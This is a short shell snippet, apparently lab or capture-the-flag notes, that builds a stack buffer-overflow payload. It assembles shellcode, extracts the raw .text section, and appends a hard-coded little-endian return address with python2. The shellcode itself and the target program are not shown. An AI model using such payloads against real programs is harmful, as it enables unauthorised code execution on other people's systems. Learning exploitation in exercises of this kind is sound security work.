gcc -nostdlib -static -o shellcode-elf shellcode.s
objcopy --dump-section .text=shellcode-raw shellcode-elf
cat shellcode-raw > payload
python2 -c "print('\xaf\xcf\xff\xff')" >> payload
